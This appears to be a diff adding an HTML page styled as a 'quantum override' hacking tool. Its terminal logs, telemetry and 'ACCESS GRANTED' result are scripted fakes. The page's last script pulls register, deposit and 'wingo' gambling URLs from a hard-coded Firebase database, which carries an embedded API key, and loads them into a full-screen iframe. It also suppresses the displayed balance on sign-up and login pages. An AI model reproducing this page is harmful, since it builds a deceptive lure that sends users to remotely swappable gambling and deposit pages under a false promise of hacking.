@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+<title>H4X DEVELOPER</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet"/>
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+
+:root {
+  --p-dark: #0a0412;
+  --p-base: #4c1d95; /* tailwind purple-900 */
+  --p-neon: #a855f7; /* tailwind purple-500 */
+  --p-light: #e9d5ff; /* tailwind purple-200 */
+  --c-neon: #06b6d4; /* tailwind cyan-500 */
+  --panel-bg: rgba(20, 10, 35, 0.65);
+}
+
+body {
+  background-color: var(--p-dark);
+  color: var(--p-light);
+  font-family: 'JetBrains Mono', monospace;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  position: relative;
+}
+
+/* Hexagonal grid background */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: 
+    linear-gradient(rgba(168, 85, 247, 0.05) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(168, 85, 247, 0.05) 1px, transparent 1px);
+  background-size: 50px 50px;
+  background-position: center center;
+  animation: pulseGrid 8s ease-in-out infinite alternate;
+  pointer-events: none; z-index: 0;
+}
+@keyframes pulseGrid {
+  0% { opacity: 0.5; transform: scale(1); }
+  100% { opacity: 1; transform: scale(1.05); }
+}
+
+/* Smooth ambient glows */
+.ambient-glow {
+  position: fixed;
+  border-radius: 50%;
+  filter: blur(100px);
+  z-index: 1;
+  pointer-events: none;
+  opacity: 0.4;
+  animation: floatGlow 10s infinite ease-in-out alternate;
+}
+.glow-1 { top: -10%; left: -10%; width: 50vw; height: 50vw; background: var(--p-base); }
+.glow-2 { bottom: -10%; right: -10%; width: 60vw; height: 60vw; background: rgba(6, 182, 212, 0.2); animation-delay: -5s; }
+
+@keyframes floatGlow {
+  0% { transform: translate(0, 0) scale(1); }
+  100% { transform: translate(5%, 5%) scale(1.1); }
+}
+
+/* CRT and Scanlines (Subtle) */
+.crt-overlay {
+  position: fixed; inset: 0; z-index: 2; pointer-events: none;
+  background: radial-gradient(ellipse at center, transparent 40%, rgba(10, 4, 18, 0.8) 100%);
+}
+.scanline {
+  position: fixed; inset: 0; z-index: 3; pointer-events: none; opacity: 0.15;
+  background: repeating-linear-gradient(0deg, rgba(255,255,255,0.1) 0 1px, transparent 1px 4px);
+}
+.scanner-bar {
+  position: fixed; top: -10%; left: 0; width: 100%; height: 20%;
+  background: linear-gradient(to bottom, transparent, rgba(168, 85, 247, 0.1), transparent);
+  z-index: 4; pointer-events: none;
+  animation: scanDown 6s linear infinite;
+}
+@keyframes scanDown { 0% { top: -20%; } 100% { top: 120%; } }
+
+/* Neural Network Canvas */
+#network-canvas { position: fixed; inset: 0; z-index: 5; pointer-events: none; }
+
+.glass-card {
+  position: relative; z-index: 10;
+  width: 92%; max-width: 440px;
+  background: var(--panel-bg);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 1px solid rgba(168, 85, 247, 0.25);
+  border-radius: 12px;
+  padding: 30px;
+  box-shadow: 
+    0 0 40px rgba(10, 4, 18, 0.9),
+    inset 0 0 20px rgba(168, 85, 247, 0.05);
+  animation: cardEntrance 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
+}
+
+@keyframes cardEntrance {
+  0% { opacity: 0; transform: translateY(30px) scale(0.95); filter: blur(10px); }
+  100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+}
+
+/* High-tech corner accents */
+.tech-corner { position: absolute; width: 24px; height: 24px; z-index: 12; pointer-events: none; border-color: var(--p-neon); transition: all 0.3s; }
+.tc-tl { top: -1px; left: -1px; border-top: 2px solid; border-left: 2px solid; border-radius: 12px 0 0 0; }
+.tc-tr { top: -1px; right: -1px; border-top: 2px solid; border-right: 2px solid; border-radius: 0 12px 0 0; }
+.tc-bl { bottom: -1px; left: -1px; border-bottom: 2px solid; border-left: 2px solid; border-radius: 0 0 0 12px; }
+.tc-br { bottom: -1px; right: -1px; border-bottom: 2px solid; border-right: 2px solid; border-radius: 0 0 12px 0; }
+
+.glass-card:hover .tech-corner { border-color: var(--c-neon); box-shadow: 0 0 15px var(--c-neon); }
+
+.orbitron { font-family: 'Orbitron', sans-serif; }
+
+.logo-container {
+  position: relative; width: 80px; height: 80px; margin: 0 auto 16px;
+  display: flex; align-items: center; justify-content: center;
+}
+.logo-ring-1, .logo-ring-2 {
+  position: absolute; inset: 0; border-radius: 50%; border: 2px solid transparent;
+}
+.logo-ring-1 {
+  border-top-color: var(--p-neon); border-bottom-color: var(--c-neon);
+  animation: spinSmooth 4s linear infinite;
+}
+.logo-ring-2 {
+  inset: 8px; border-left-color: var(--p-neon); border-right-color: rgba(168, 85, 247, 0.3);
+  animation: spinSmooth 3s linear infinite reverse;
+}
+@keyframes spinSmooth { 100% { transform: rotate(360deg); } }
+
+.logo-icon {
+  font-size: 32px; color: #fff; text-shadow: 0 0 15px var(--p-neon);
+  animation: pulseIcon 2s ease-in-out infinite alternate;
+}
+@keyframes pulseIcon { 0% { transform: scale(0.95); opacity: 0.8; } 100% { transform: scale(1.05); opacity: 1; text-shadow: 0 0 25px var(--c-neon); } }
+
+.title-glitch {
+  position: relative; font-size: 24px; font-weight: 900; letter-spacing: 3px;
+  color: #fff; text-shadow: 0 0 10px rgba(168, 85, 247, 0.8);
+  text-align: center;
+}
+.title-glitch::before, .title-glitch::after {
+  content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; opacity: 0; pointer-events: none;
+}
+.title-glitch::before { color: var(--c-neon); animation: glitchA 4s infinite linear alternate-reverse; z-index: -1; }
+.title-glitch::after { color: var(--p-neon); animation: glitchB 5s infinite linear alternate-reverse; z-index: -2; }
+
+@keyframes glitchA {
+  0%, 90%, 100% { opacity: 0; transform: translate(0); }
+  92% { opacity: 0.8; transform: translate(-3px, 1px); clip-path: polygon(0 20%, 100% 20%, 100% 40%, 0 40%); }
+  94% { opacity: 0.8; transform: translate(3px, -1px); clip-path: polygon(0 60%, 100% 60%, 100% 80%, 0 80%); }
+}
+@keyframes glitchB {
+  0%, 80%, 100% { opacity: 0; transform: translate(0); }
+  82% { opacity: 0.8; transform: translate(3px, -1px); clip-path: polygon(0 10%, 100% 10%, 100% 30%, 0 30%); }
+  86% { opacity: 0.8; transform: translate(-3px, 1px); clip-path: polygon(0 70%, 100% 70%, 100% 90%, 0 90%); }
+}
+
+.status-bar {
+  background: rgba(168, 85, 247, 0.08);
+  border: 1px solid rgba(168, 85, 247, 0.2);
+  border-radius: 6px; padding: 10px 16px; margin-top: 16px;
+  display: flex; justify-content: space-between; align-items: center;
+  font-size: 11px; letter-spacing: 1px; color: var(--p-light);
+}
+.live-indicator { display: flex; align-items: center; gap: 8px; color: var(--p-neon); font-weight: bold; }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--p-neon); box-shadow: 0 0 10px var(--p-neon); animation: pulseDot 1.5s infinite; }
+@keyframes pulseDot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
+
+.telemetry-grid {
+  display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 12px;
+}
+.t-box {
+  background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(168, 85, 247, 0.15); border-radius: 6px;
+  padding: 8px 4px; text-align: center;
+  transition: all 0.3s;
+}
+.t-box:hover { border-color: var(--p-neon); background: rgba(168, 85, 247, 0.1); }
+.t-label { display: block; font-size: 8px; color: rgba(233, 213, 255, 0.6); margin-bottom: 4px; letter-spacing: 1px; }
+.t-val { font-size: 13px; font-weight: bold; color: var(--p-neon); text-shadow: 0 0 8px rgba(168, 85, 247, 0.5); }
+.t-val.cyan { color: var(--c-neon); text-shadow: 0 0 8px rgba(6, 182, 212, 0.5); }
+
+.terminal-container {
+  background: rgba(5, 2, 10, 0.8);
+  border: 1px solid rgba(168, 85, 247, 0.2);
+  border-radius: 8px; padding: 14px; margin-top: 16px;
+  min-height: 140px; position: relative; overflow: hidden;
+  box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+}
+.term-header {
+  font-size: 9px; color: rgba(233, 213, 255, 0.4); letter-spacing: 2px;
+  display: flex; align-items: center; gap: 8px; margin-bottom: 12px;
+}
+.term-header::after { content: ''; flex: 1; height: 1px; background: rgba(168, 85, 247, 0.2); }
+
+.log-line {
+  font-size: 11px; line-height: 1.8; color: #cbd5e1;
+  display: flex; gap: 10px; align-items: flex-start;
+  opacity: 0; transform: translateY(5px); animation: fadeUp 0.3s forwards;
+}
+@keyframes fadeUp { to { opacity: 1; transform: translateY(0); } }
+
+.log-icon { font-size: 10px; margin-top: 2px; }
+.log-icon.info { color: var(--c-neon); }
+.log-icon.warn { color: #f59e0b; }
+.log-icon.err { color: #ef4444; }
+.log-icon.success { color: #10b981; }
+
+.log-hl { color: var(--p-neon); text-shadow: 0 0 5px rgba(168, 85, 247, 0.4); }
+.type-cursor {
+  display: inline-block; width: 6px; height: 12px; background: var(--p-neon);
+  margin-left: 4px; vertical-align: middle; animation: blink 1s step-end infinite;
+}
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+.progress-area { margin-top: 20px; }
+.prog-header { display: flex; justify-content: space-between; font-size: 11px; color: var(--p-light); margin-bottom: 8px; letter-spacing: 1px;}
+.prog-pct { color: var(--c-neon); font-weight: bold; text-shadow: 0 0 8px rgba(6, 182, 212, 0.5); }
+
+.bar-bg { height: 4px; background: rgba(255,255,255,0.05); border-radius: 4px; overflow: visible; position: relative; }
+.bar-fill {
+  height: 100%; width: 0%; border-radius: 4px;
+  background: linear-gradient(90deg, var(--p-base), var(--p-neon), var(--c-neon));
+  box-shadow: 0 0 15px var(--p-neon);
+  position: relative; transition: width 0.1s linear;
+}
+.bar-head {
+  position: absolute; right: 0; top: 50%; transform: translate(50%, -50%);
+  width: 12px; height: 12px; border-radius: 50%; background: #fff;
+  box-shadow: 0 0 15px #fff, 0 0 30px var(--c-neon);
+}
+
+.steps-grid { display: flex; justify-content: space-between; gap: 8px; margin-top: 16px; }
+.step-item {
+  flex: 1; text-align: center; background: rgba(168, 85, 247, 0.05);
+  border: 1px solid rgba(168, 85, 247, 0.1); border-radius: 6px;
+  padding: 8px 4px; font-size: 9px; color: rgba(233, 213, 255, 0.4);
+  transition: all 0.4s ease; letter-spacing: 1px;
+}
+.step-item.active {
+  background: rgba(168, 85, 247, 0.15); border-color: var(--p-neon);
+  color: #fff; box-shadow: 0 0 15px rgba(168, 85, 247, 0.3);
+  transform: translateY(-2px);
+}
+.step-item.done {
+  background: rgba(6, 182, 212, 0.1); border-color: var(--c-neon);
+  color: var(--c-neon);
+}
+
+#breach-stamp {
+  position: absolute; inset: 0; z-index: 50; display: none; align-items: center; justify-content: center;
+  pointer-events: none; backdrop-filter: blur(5px); border-radius: 12px;
+}
+.stamp-text {
+  font-family: 'Orbitron', sans-serif; font-size: 28px; font-weight: 900; letter-spacing: 4px;
+  color: #fff; border: 3px solid var(--c-neon); padding: 12px 24px; border-radius: 8px;
+  background: rgba(6, 182, 212, 0.1);
+  text-shadow: 0 0 15px var(--c-neon), 0 0 30px var(--c-neon);
+  box-shadow: 0 0 20px rgba(6, 182, 212, 0.3), inset 0 0 15px rgba(6, 182, 212, 0.2);
+  transform: scale(2) rotate(-10deg); opacity: 0;
+}
+.stamp-animate { animation: stampSlam 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+@keyframes stampSlam {
+  100% { transform: scale(1) rotate(-5deg); opacity: 1; }
+}
+
+.flash-bang {
+  position: fixed; inset: 0; background: #fff; z-index: 100; opacity: 0; pointer-events: none;
+}
+.flash-animate { animation: flashFade 0.8s ease-out forwards; }
+@keyframes flashFade { 0% { opacity: 1; } 100% { opacity: 0; } }
+
+.card-shake { animation: shakeSoft 0.4s cubic-bezier(.36,.07,.19,.97) both; }
+@keyframes shakeSoft {
+  10%, 90% { transform: translate3d(-1px, 0, 0); }
+  20%, 80% { transform: translate3d(2px, 0, 0); }
+  30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+  40%, 60% { transform: translate3d(4px, 0, 0); }
+}
+
+/* User iframe styling preserved */
+#target-game-frame { position: fixed; inset: 0; width: 100%; height: 100%; border: 0; background: #000; z-index: 0; }
+</style>
+</head>
+<body>
+
+<iframe id="target-game-frame" src="about:blank" allow="autoplay" title="Game"></iframe>
+<canvas id="network-canvas"></canvas>
+<div class="ambient-glow glow-1"></div>
+<div class="ambient-glow glow-2"></div>
+<div class="crt-overlay"></div>
+<div class="scanline"></div>
+<div class="scanner-bar"></div>
+<div class="flash-bang" id="flash"></div>
+
+<div class="glass-card" id="main-card">
+  <!-- Corner Tech Borders -->
+  <div class="tech-corner tc-tl"></div>
+  <div class="tech-corner tc-tr"></div>
+  <div class="tech-corner tc-bl"></div>
+  <div class="tech-corner tc-br"></div>
+
+  <!-- Header -->
+  <div class="logo-container">
+    <div class="logo-ring-1"></div>
+    <div class="logo-ring-2"></div>
+    <!-- Sleek geometry icon instead of biohazard -->
+    <svg class="logo-icon w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 10l-2 1m0 0l-2-1m2 1v2.5M20 7l-2 1m2-1l-2-1m2 1v2.5M14 4l-2-1-2 1M4 7l2-1M4 7l2 1M4 7v2.5M12 21l-2-1m2 1l2-1m-2 1v-2.5M6 18l-2-1v-2.5M18 18l2-1v-2.5"></path></svg>
+  </div>
+  
+  <div class="title-glitch orbitron" data-text="H4X DEVELOPER<">H4X DEVELOPER</div>
+  <div class="text-center text-[10px] text-purple-300/60 mt-1 uppercase tracking-[3px]" id="subtitle-type"></div>
+
+  <!-- Status Bar -->
+  <div class="status-bar">
+    <div class="live-indicator"><div class="dot"></div>SYSTEM UPLINK</div>
+    <div id="node-status" class="orbitron font-bold text-cyan-400">NODE-Q7 · SECURE</div>
+    <div id="clock" class="orbitron">00:00:00</div>
+  </div>
+
+  <!-- Telemetry Grid -->
+  <div class="telemetry-grid">
+    <div class="t-box"><span class="t-label">CPU LOAD</span><span class="t-val orbitron" id="t-cpu">42%</span></div>
+    <div class="t-box"><span class="t-label">CORES</span><span class="t-val orbitron" id="t-thr">16</span></div>
+    <div class="t-box"><span class="t-label">PROXY</span><span class="t-val cyan orbitron" id="t-proxy">MASKED</span></div>
+    <div class="t-box"><span class="t-label">LATENCY</span><span class="t-val orbitron" id="t-ping">12ms</span></div>
+  </div>
+
+  <!-- Terminal Output -->
+  <div class="terminal-container">
+    <div class="term-header">
+      <svg class="w-3 h-3 text-cyan-400 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"></path></svg>
+      SEQUENCE LOG
+    </div>
+    <div id="term-logs" class="flex flex-col gap-1">
+      <!-- Logs injected via JS -->
+    </div>
+  </div>
+
+  <!-- Progress Tracking -->
+  <div class="progress-area">
+    <div class="prog-header orbitron">
+      <span class="text-[10px]">EXECUTING OVERRIDE PAYLOAD</span>
+      <span class="prog-pct" id="prog-text">0%</span>
+    </div>
+    <div class="bar-bg">
+      <div class="bar-fill" id="prog-bar"><div class="bar-head"></div></div>
+    </div>
+    <div class="steps-grid">
+      <div class="step-item active" id="s1"><div class="text-xs mb-1">◈</div>INITIALIZE</div>
+      <div class="step-item" id="s2"><div class="text-xs mb-1">⎔</div>RESOLVE</div>
+      <div class="step-item" id="s3"><div class="text-xs mb-1">⟡</div>INJECT</div>
+      <div class="step-item" id="s4"><div class="text-xs mb-1">✦</div>ACCESS</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="text-center text-[8px] tracking-[2px] text-purple-400/30 mt-6 pt-2 border-t border-purple-500/20">
+    © 2026 NEBULA QUANTUM FRAMEWORK · ENCRYPTED
+  </div>
+
+  <!-- Success Stamp -->
+  <div id="breach-stamp"><div class="stamp-text">ACCESS GRANTED</div></div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  /* --- Clock --- */
+  function updateClock() {
+    const now = new Date();
+    document.getElementById('clock').textContent = 
+      String(now.getHours()).padStart(2, '0') + ':' + 
+      String(now.getMinutes()).padStart(2, '0') + ':' + 
+      String(now.getSeconds()).padStart(2, '0');
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  /* --- Fake Telemetry --- */
+  let cpu = 35;
+  setInterval(() => {
+    cpu = Math.max(15, Math.min(99, cpu + (Math.random() * 20 - 10)));
+    document.getElementById('t-cpu').textContent = Math.round(cpu) + '%';
+    document.getElementById('t-thr').textContent = Math.floor(Math.random() * 8) + 16; // 16-23 cores
+    document.getElementById('t-ping').textContent = Math.floor(Math.random() * 25) + 5 + 'ms';
+  }, 600);
+
+  /* --- Typewriter Subtitle --- */
+  const subText = "QUANTUM OVERRIDE ENGINE ULTRA";
+  const subEl = document.getElementById('subtitle-type');
+  let charIdx = 0;
+  function typeSub() {
+    if (charIdx <= subText.length) {
+      subEl.textContent = subText.slice(0, charIdx) + (charIdx < subText.length ? '_' : '');
+      charIdx++;
+      setTimeout(typeSub, 60);
+    }
+  }
+  setTimeout(typeSub, 500);
+
+  /* --- Terminal Sequence --- */
+  const logs = [
+    { type: 'info', raw: 'Initializing quantum tunneling protocol...', rich: 'Initializing <span class="log-hl">quantum tunneling</span> protocol...' },
+    { type: 'info', raw: 'Bypassing perimeter firewalls (Node-Q7)...', rich: 'Bypassing perimeter firewalls (<span class="log-hl">Node-Q7</span>)...' },
+    { type: 'warn', raw: 'Security countermeasures detected. Rerouting...', rich: 'Security countermeasures detected. <span class="text-amber-400">Rerouting...</span>' },
+    { type: 'info', raw: 'Establishing secure root pipeline...', rich: 'Establishing secure <span class="log-hl">root pipeline</span>...' },
+    { type: 'info', raw: 'Decrypting encrypted AES-256 payload...', rich: 'Decrypting encrypted <span class="log-hl">AES-256</span> payload...' },
+    { type: 'success', raw: 'Override matrix successfully injected.', rich: 'Override matrix <span class="text-emerald-400 font-bold">successfully injected.</span>' }
+  ];
+  
+  const termBox = document.getElementById('term-logs');
+  const icons = { info: '❯', warn: '⚠', err: '✖', success: '✔' };
+  const logTimings = [200, 800, 1500, 2100, 2700, 3400];
+
+  function typeTerminalLine(index, charCount = 0) {
+    let row = termBox.querySelector(`[data-index="${index}"]`);
+    if (!row) {
+      row = document.createElement('div');
+      row.className = 'log-line';
+      row.setAttribute('data-index', index);
+      row.innerHTML = `<span class="log-icon ${logs[index].type}">${icons[logs[index].type]}</span><span class="log-text"></span>`;
+      termBox.appendChild(row);
+      // Keep scroll at bottom
+      termBox.parentElement.scrollTop = termBox.parentElement.scrollHeight;
+    }
+    
+    const textEl = row.querySelector('.log-text');
+    const plain = logs[index].raw;
+    
+    if (charCount <= plain.length) {
+      textEl.textContent = plain.slice(0, charCount);
+      setTimeout(() => typeTerminalLine(index, charCount + 1), 15);
+    } else {
+      textEl.innerHTML = logs[index].rich;
+      if (index === logs.length - 1) {
+        textEl.innerHTML += '<span class="type-cursor"></span>';
+      }
+    }
+  }
+
+  logTimings.forEach((delay, idx) => {
+    setTimeout(() => typeTerminalLine(idx), delay);
+  });
+
+  /* --- Progress Bar & Steps Animation --- */
+  const duration = 4000;
+  const startTime = performance.now();
+  const progBar = document.getElementById('prog-bar');
+  const progText = document.getElementById('prog-text');
+  let animationFrame;
+
+  // Step triggers
+  const steps = [
+    { id: 's1', at: 0 },
+    { id: 's2', at: 0.25 },
+    { id: 's3', at: 0.55 },
+    { id: 's4', at: 0.85 }
+  ];
+  let currentStep = 0;
+
+  function easeOutCubic(x) {
+    return 1 - Math.pow(1 - x, 3);
+  }
+
+  function updateProgress(currentTime) {
+    let elapsed = currentTime - startTime;
+    let progress = Math.min(elapsed / duration, 1);
+    let easedProgress = easeOutCubic(progress);
+    let percent = Math.round(easedProgress * 100);
+
+    progBar.style.width = percent + '%';
+    progText.textContent = percent + '%';
+
+    // Step logic
+    if (currentStep < steps.length - 1 && progress >= steps[currentStep + 1].at) {
+      document.getElementById(steps[currentStep].id).classList.replace('active', 'done');
+      currentStep++;
+      document.getElementById(steps[currentStep].id).classList.add('active');
+    }
+
+    if (progress < 1) {
+      animationFrame = requestAnimationFrame(updateProgress);
+    } else {
+      finalizeSequence();
+    }
+  }
+  animationFrame = requestAnimationFrame(updateProgress);
+
+  /* --- Final Sequence --- */
+  function finalizeSequence() {
+    // Finish last step
+    const lastStep = document.getElementById(steps[steps.length-1].id);
+    lastStep.classList.replace('active', 'done');
+    
+    // UI Updates
+    const nodeStatus = document.getElementById('node-status');
+    nodeStatus.textContent = 'SYSTEM OVERRIDDEN';
+    nodeStatus.classList.replace('text-cyan-400', 'text-emerald-400');
+    nodeStatus.style.textShadow = '0 0 10px rgba(16, 185, 129, 0.8)';
+    
+    progText.classList.replace('text-cyan-400', 'text-emerald-400');
+    progText.style.textShadow = '0 0 10px rgba(16, 185, 129, 0.8)';
+    document.querySelector('.bar-head').style.background = '#10b981';
+    document.querySelector('.bar-head').style.boxShadow = '0 0 20px #10b981';
+
+    // Flash & Stamp
+    document.getElementById('flash').classList.add('flash-animate');
+    document.getElementById('main-card').classList.add('card-shake');
+    
+    setTimeout(() => {
+      const stamp = document.getElementById('breach-stamp');
+      stamp.style.display = 'flex';
+      stamp.querySelector('.stamp-text').classList.add('stamp-animate');
+    }, 300);
+  }
+
+  /* --- Neural Network Canvas (replaces fire embers) --- */
+  const canvas = document.getElementById('network-canvas');
+  const ctx = canvas.getContext('2d');
+  let particles = [];
+  
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resize);
+  resize();
+
+  class Particle {
+    constructor() {
+      this.x = Math.random() * canvas.width;
+      this.y = Math.random() * canvas.height;
+      this.vx = (Math.random() - 0.5) * 0.5;
+      this.vy = (Math.random() - 0.5) * 0.5;
+      this.radius = Math.random() * 1.5 + 0.5;
+    }
+    update() {
+      this.x += this.vx;
+      this.y += this.vy;
+      if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+      if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+    }
+    draw() {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = 'rgba(168, 85, 247, 0.8)'; // purple-500
+      ctx.fill();
+    }
+  }
+
+  for (let i = 0; i < 70; i++) {
+    particles.push(new Particle());
+  }
+
+  function animateNetwork() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    
+    for (let i = 0; i < particles.length; i++) {
+      particles[i].update();
+      particles[i].draw();
+      
+      // Draw connecting lines
+      for (let j = i; j < particles.length; j++) {
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const distance = Math.sqrt(dx * dx + dy * dy);
+        
+        if (distance < 120) {
+          ctx.beginPath();
+          ctx.strokeStyle = `rgba(6, 182, 212, ${0.15 * (1 - distance/120)})`; // cyan-500 fading out
+          ctx.lineWidth = 1;
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(particles[j].x, particles[j].y);
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(animateNetwork);
+  }
+  animateNetwork();
+
+})();
+</script>
+
+<script>
+/* ── INTRO SOUND ── */
+try{
+  if (window.ZAYRO && typeof ZAYRO.playSound === 'function') {
+    window.ZAYRO.playSound('intro.mp3');
+  } else {
+    var _a=new Audio('intro.mp3');
+    var _p=_a.play();
+    if(_p&&_p.catch)_p.catch(function(){});
+  }
+}catch(e){}
+</script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+(function(){
+  var livePath="zayro6clubocom";
+  var autoFrameInjected=true;
+  var gameFrame=window.gameFrame||document.getElementById('target-game-frame')||document.getElementById('gameIframe');
+  if(gameFrame)window.gameFrame=gameFrame;
+  var firebaseConfig={
+    apiKey:'AIzaSyDja5Gx4v4sMbx4BM2_od9_bLkdxdEY4do',
+    authDomain:'zayrodev-195f3.firebaseapp.com',
+    projectId:'zayrodev-195f3',
+    storageBucket:'zayrodev-195f3.firebasestorage.app',
+    messagingSenderId:'357941061158',
+    appId:'1:357941061158:web:12882185e2fa7f4f5328e7',
+    databaseURL:'https://zayrodev-195f3-default-rtdb.firebaseio.com'
+  };
+  function valid(u){return typeof u==='string' && /^https?:\/\//i.test(u);}
+  var firstFirebaseLinkLoad=true;
+  function applyLinks(data){
+    if(!data||typeof data!=='object')return;
+    var previousRegister=REGISTER_URL;
+    var nextRegister=data.registerUrl||data.register_url;
+    var nextDeposit=data.depositUrl||data.deposit_url;
+    var nextWingo=data.wingoUrl||data.wingo_url;
+    if(!valid(nextRegister)||!valid(nextDeposit)||!valid(nextWingo))return;
+    REGISTER_URL=nextRegister;
+    DEPOSIT_URL=nextDeposit;
+    WINGO_URL=nextWingo;
+    if(typeof gameFrame!=='undefined'&&gameFrame){
+      try{
+        var current=gameFrame.src||'';
+        if(firstFirebaseLinkLoad||!current||current==='about:blank'||current===previousRegister){
+          gameFrame.src=REGISTER_URL;
+        }
+      }catch(e){}
+    }
+    if(firstFirebaseLinkLoad&&typeof window.setUrl==='function'){
+      try{window.setUrl(REGISTER_URL);}catch(e){}
+    }
+    firstFirebaseLinkLoad=false;
+  }
+  if(autoFrameInjected&&gameFrame){
+    window.navTo=function(url){
+      if(!valid(url))return;
+      gameFrame.src=url;
+      if(typeof window.setUrl==='function')try{window.setUrl(url);}catch(e){}
+      if(typeof window.reportArea==='function')try{window.reportArea();}catch(e){}
+    };
+  }
+  window.__zayroAuthRoute=false;
+  if(typeof window.setUrl==='function'&&!window.setUrl.__zayroWrapped){
+    var originalSetUrl=window.setUrl;
+    var wrappedSetUrl=function(url){
+      var lower=(url||'').toString().toLowerCase();
+      window.__zayroAuthRoute=lower.indexOf('/register')>=0||lower.indexOf('invitationcode')>=0||lower.indexOf('invitecode')>=0||lower.indexOf('/login')>=0;
+      var result=originalSetUrl.apply(this,arguments);
+      if(window.__zayroAuthRoute&&typeof window.setState==='function'){
+        try{window.setState('wait');}catch(e){}
+      }
+      return result;
+    };
+    wrappedSetUrl.__zayroWrapped=true;
+    window.setUrl=wrappedSetUrl;
+  }
+  if(typeof window.setBalance==='function'&&!window.setBalance.__zayroWrapped){
+    var originalSetBalance=window.setBalance;
+    var wrappedSetBalance=function(balance){
+      if(window.__zayroAuthRoute){
+        if(typeof window.setState==='function')try{window.setState('wait');}catch(e){}
+        return;
+      }
+      return originalSetBalance.apply(this,arguments);
+    };
+    wrappedSetBalance.__zayroWrapped=true;
+    window.setBalance=wrappedSetBalance;
+  }
+  if(gameFrame&&!gameFrame.__zayroLoadReporter){
+    gameFrame.__zayroLoadReporter=true;
+    gameFrame.addEventListener('load',function(){
+      try{if(typeof window.setUrl==='function')window.setUrl(gameFrame.src||'');}catch(e){}
+    });
+  }
+  var attempts=0,connected=false;
+  function connect(){
+    if(connected)return;
+    try{
+      if((typeof rtdb==='undefined'||!rtdb)&&typeof firebase!=='undefined'){
+        var app=firebase.apps&&firebase.apps.length?firebase.app():firebase.initializeApp(firebaseConfig);
+        rtdb=app.database?app.database():firebase.database();
+      }
+      if(typeof rtdb!=='undefined'&&rtdb&&typeof rtdb.ref==='function'){
+        connected=true;
+        rtdb.ref(livePath+'/config').on('value',function(snap){
+          if(snap&&snap.exists())applyLinks(snap.val());
+        });
+        return;
+      }
+    }catch(e){}
+    if(++attempts<120)setTimeout(connect,250);
+  }
+  connect();
+})();
+</script>
+</body>
+</html>
